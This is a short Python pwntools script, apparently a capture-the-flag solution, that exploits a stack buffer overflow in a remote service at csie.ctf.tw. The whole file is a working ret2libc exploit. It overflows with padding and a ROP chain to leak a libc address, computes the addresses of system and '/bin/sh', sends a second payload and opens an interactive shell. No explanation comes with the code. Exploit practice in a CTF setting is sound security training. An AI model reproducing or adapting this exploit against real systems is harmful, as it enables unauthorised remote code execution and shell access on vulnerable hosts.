from pwn import *

r = remote('csie.ctf.tw',10131) # 
#r = remote('127.0.0.1',8888) # local
raw_input('pause')

junk = r.recvrepeat(1)
print junk
#pop_ebx_ret = 0x080486cf
p = 'A'*17 + p32(0x8048410) + p32(0x80485e6) + p32(0x804a01c) + '\n'

r.send(p)

string = r.recvrepeat(1)
print string[len(p):].encode('hex')
base = u32(string[len(p)+1:len(p)+5]) - 0x00064c10 # libc.so.6
#base = u32(string[len(p)+1:len(p)+5]) - 0x00062950 # local

print hex(base)

system = base + 0x0003fcd0 # libc.so.6
#system = base + 0x0003b160 # local

sh = base + 0x015da84

r.send('A'*17 + p32(system) + p32(0) + p32(sh) + '\n')

r.interactive()
